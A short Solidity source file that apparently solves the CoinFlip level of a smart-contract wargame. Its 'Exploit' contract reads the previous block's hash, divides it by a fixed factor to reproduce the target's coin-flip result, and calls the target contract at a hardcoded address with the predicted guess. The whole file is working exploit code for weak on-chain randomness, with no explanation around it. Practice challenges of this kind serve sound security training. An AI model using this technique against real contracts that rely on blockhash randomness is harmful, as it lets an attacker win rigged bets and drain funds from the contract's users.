pragma solidity ^0.5.0;

contract CoinFlip {

  function flip(bool _guess) public returns (bool);

}

contract Exploit {

  address public outside = 0xe316D917aEeB185Ab9b4Fc9FA07EC7BEccFeCc9b;

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  CoinFlip outCoin = CoinFlip(outside);

  function guess() public {

    uint256 blockValue = uint256(blockhash(block.number-1));

    uint256 coinFlip = blockValue / FACTOR;

    bool side = coinFlip == 1 ? true : false;

    outCoin.flip(side);

  }

}
